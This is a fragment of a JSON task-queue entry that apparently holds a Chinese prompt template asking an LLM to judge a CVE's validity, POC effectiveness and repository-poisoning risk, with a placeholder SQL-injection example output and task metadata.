分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 0,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": null,
+    "last_error": null,
+    "created_at": 1785060182.8079991,
+    "last_attempt": 0,
+    "next_attempt": 1785060187.8027234,
+    "metadata": {},
+    "task_id": "task_CVE-2026-15981_1785060182",
     "required_result_fields": [
       "poc_available",
       "condition",
